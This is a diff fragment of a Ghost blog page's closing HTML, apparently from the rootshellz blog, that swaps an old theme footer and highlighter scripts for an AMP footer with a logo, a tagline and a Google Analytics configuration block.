-             <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://ghost.org"><span class="icon-ghost-text">Ghost</span></a> in <a href="https://github.com/mityalebedev/The-Shell">The Shell</a> theme.</section>
-        </div>
+        </article>
+    </main>
+    <footer class="page-footer">
+            <amp-img class="site-icon" src="https://blog.rootshellz.com/content/images/2020/11/Blog-Logo.png" width="50" height="50" layout="fixed"></amp-img>
+        <h3>rootshellz</h3>
+            <p>Drink all the booze hack all the things...</p>
+        <p><a href="https://blog.rootshellz.com">Read more posts →</a></p>
+        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
     </footer>
-
-    <!-- https://cdnjs.com/libraries/prism -->
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.22.0/prism.min.js"></script>
-
-    <script type='text/javascript' src="/assets/highlighter/prettify.js?v=8d33012fb0"></script>
-    <script type='text/javascript' src="/assets/js/shell.js?v=8d33012fb0"></script>
+    
+            <amp-analytics type="gtag" data-credentials="include">
+                <script type="application/json">
+                    {
+                        "vars" : {
+                            "gtag_id": "G-TM0JKQZ7H1",
+                            "config" : {
+                                "G-TM0JKQZ7H1": { "groups": "default" }
+                            }
+                        }
+                    }
+                </script>
+            </amp-analytics>
+        
 </body>
 </html>
